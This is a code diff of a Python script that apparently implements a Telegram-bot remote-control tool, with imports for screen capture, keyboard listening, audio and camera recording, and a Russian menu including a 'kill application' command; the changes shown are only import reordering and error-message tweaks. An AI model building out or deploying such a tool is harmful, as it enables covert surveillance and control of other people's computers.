@@ -1,24 +1,22 @@
-import random
-import telebot
-import os
-import webbrowser
-import pyautogui
-import time
-import socket
-import requests
 import re
-import socket
-from PIL import Image, ImageGrab
-from bs4 import BeautifulSoup
-from playsound import playsound
-import pyaudio,wave
 import cv2
+import time
 import ctypes
-from sys import platform
-import sys
+import random
+import socket
+import telebot
+import os, sys
+import requests
+import pyautogui
+import webbrowser
+import pyaudio,wave
 from ctypes import *
-from ctypes.wintypes import *
+from sys import platform
 from pynput import keyboard
+from bs4 import BeautifulSoup
+from ctypes.wintypes import *
+from playsound import playsound
+from PIL import Image, ImageGrab
 
 mytoken = 'telegram token'
 
@@ -43,10 +41,6 @@ appkeyboard.row('Назад🗿','Убить приложение❌','Вклю�
 
 @bot.message_handler(content_types=['text'])
 def commands(message):
-
-
-
-
         if message.text == '/start':
                 bot.send_message(message.chat.id,'Выбери действие',reply_markup=mainkeyboard)
 
@@ -326,5 +320,5 @@ def get_kill(message):
 try:
         bot.polling(none_stop=True, interval=0)
         print('Bot (ok)')
-except:
-        print('Bot (eror)')
+except Exception as e:
+        print(f'Bot (erorr)\n {e}')
